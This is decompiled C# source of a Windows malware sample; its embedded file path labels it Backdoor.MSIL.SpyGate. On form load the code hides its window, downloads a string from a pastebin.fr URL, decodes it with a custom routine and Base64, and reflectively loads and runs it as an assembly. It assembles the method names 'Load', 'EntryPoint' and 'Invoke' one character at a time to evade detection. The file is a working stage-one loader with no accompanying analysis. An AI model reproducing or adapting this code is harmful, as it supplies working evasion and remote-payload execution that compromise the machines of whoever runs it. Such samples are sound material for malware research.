// Decompiled with JetBrains decompiler
// Type: newfair.Form1
// Assembly: newfair, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: B25E61CD-D161-4508-BF62-1AA07BAFAAEF
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.07\Backdoor.MSIL.SpyGate.amgz-eec2a905b50d864d039bf91466cc013cd4cd3b0246afeda36b7ddcc9c7fd63fe.exe

using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Net;
using System.Runtime.CompilerServices;
using System.Text;
using System.Threading;
using System.Windows.Forms;

namespace newfair
{
  [DesignerGenerated]
  public class Form1 : Form
  {
    public WebClient er;
    private IContainer components;

    public Form1()
    {
      this.Load += new EventHandler(this.Form1_Load);
      this.er = new WebClient();
      this.InitializeComponent();
    }

    private void Form1_Load(object sender, EventArgs e)
    {
      char ch1 = 'E';
      char ch2 = 'n';
      char ch3 = 't';
      char ch4 = 'r';
      char ch5 = 'y';
      char ch6 = 'P';
      char ch7 = 'o';
      char ch8 = 'i';
      char ch9 = 'n';
      char ch10 = 't';
      string MethodName1 = Conversions.ToString(ch1) + Conversions.ToString(ch2) + Conversions.ToString(ch3) + Conversions.ToString(ch4) + Conversions.ToString(ch5) + Conversions.ToString(ch6) + Conversions.ToString(ch7) + Conversions.ToString(ch8) + Conversions.ToString(ch9) + Conversions.ToString(ch10);
      char ch11 = 'I';
      char ch12 = 'n';
      char ch13 = 'v';
      char ch14 = 'o';
      char ch15 = 'k';
      char ch16 = 'e';
      string MethodName2 = Conversions.ToString(ch11) + Conversions.ToString(ch12) + Conversions.ToString(ch13) + Conversions.ToString(ch14) + Conversions.ToString(ch15) + Conversions.ToString(ch16);
      char ch17 = 'L';
      char ch18 = 'o';
      char ch19 = 'a';
      char ch20 = 'd';
      string MethodName3 = Conversions.ToString(ch17) + Conversions.ToString(ch18) + Conversions.ToString(ch19) + Conversions.ToString(ch20);
      this.Hide();
      this.Opacity = 0.0;
      this.ShowIcon = false;
      this.ShowInTaskbar = false;
      string input = this.er.DownloadString("http://pastebin.fr/pastebin.php?dl=108075");
      Thread.Sleep(3000);
      RuntimeHelpers.GetObjectValue(Versioned.CallByName(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(Versioned.CallByName(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(Versioned.CallByName((object) AppDomain.CurrentDomain, MethodName3, CallType.Get, (object) Convert.FromBase64String(this.VernamDec(input, "rtgggggg"))))), MethodName1, CallType.Get, (object[]) null))), MethodName2, CallType.Method, (object) "", null));
    }

    public string VernamDec(string input, string pass)
    {
      StringBuilder stringBuilder = new StringBuilder();
      string str1 = input;
      int index = 0;
      while (index < str1.Length)
      {
        string str2 = Strings.ChrW(checked ((int) Math.Round(unchecked ((double) str1[index] / (double) Strings.AscW(pass) % Math.PI)))).ToString();
        stringBuilder.Append(str2);
        checked { ++index; }
      }
      return stringBuilder.ToString();
    }

    private void Button1_Click(object sender, EventArgs e)
    {
      int num = (int) Interaction.MsgBox((object) "helloword");
    }

    [DebuggerNonUserCode]
    protected override void Dispose(bool disposing)
    {
      try
      {
        if (!disposing || this.components == null)
          return;
        this.components.Dispose();
      }
      finally
      {
        base.Dispose(disposing);
      }
    }

    [DebuggerStepThrough]
    private void InitializeComponent()
    {
      ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof (Form1));
      this.Button1 = new Button();
      this.PictureBox1 = new PictureBox();
      this.Label1 = new Label();
      ((ISupportInitialize) this.PictureBox1).BeginInit();
      this.SuspendLayout();
      this.Button1.Location = new Point(310, 478);
      this.Button1.Name = "Button1";
      this.Button1.Size = new Size(75, 23);
      this.Button1.TabIndex = 0;
      this.Button1.Text = "Button1";
      this.Button1.UseVisualStyleBackColor = true;
      this.PictureBox1.Image = (Image) componentResourceManager.GetObject("PictureBox1.Image");
      this.PictureBox1.Location = new Point(0, -1);
      this.PictureBox1.Name = "PictureBox1";
      this.PictureBox1.Size = new Size(678, 428);
      this.PictureBox1.SizeMode = PictureBoxSizeMode.StretchImage;
      this.PictureBox1.TabIndex = 1;
      this.PictureBox1.TabStop = false;
      this.Label1.AutoSize = true;
      this.Label1.Location = new Point(145, 487);
      this.Label1.Name = "Label1";
      this.Label1.Size = new Size(38, 13);
      this.Label1.TabIndex = 2;
      this.Label1.Text = "Label1";
      this.AutoScaleDimensions = new SizeF(6f, 13f);
      this.AutoScaleMode = AutoScaleMode.Font;
      this.ClientSize = new Size(690, 545);
      this.Controls.Add((Control) this.Label1);
      this.Controls.Add((Control) this.PictureBox1);
      this.Controls.Add((Control) this.Button1);
      this.Name = nameof (Form1);
      this.Text = nameof (Form1);
      ((ISupportInitialize) this.PictureBox1).EndInit();
      this.ResumeLayout(false);
      this.PerformLayout();
    }

    internal virtual Button Button1
    {
      get => this._Button1;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.Button1_Click);
        Button button1_1 = this._Button1;
        if (button1_1 != null)
          button1_1.Click -= eventHandler;
        this._Button1 = value;
        Button button1_2 = this._Button1;
        if (button1_2 == null)
          return;
        button1_2.Click += eventHandler;
      }
    }

    [field: AccessedThroughProperty("PictureBox1")]
    internal virtual PictureBox PictureBox1 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

    [field: AccessedThroughProperty("Label1")]
    internal virtual Label Label1 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }
  }
}
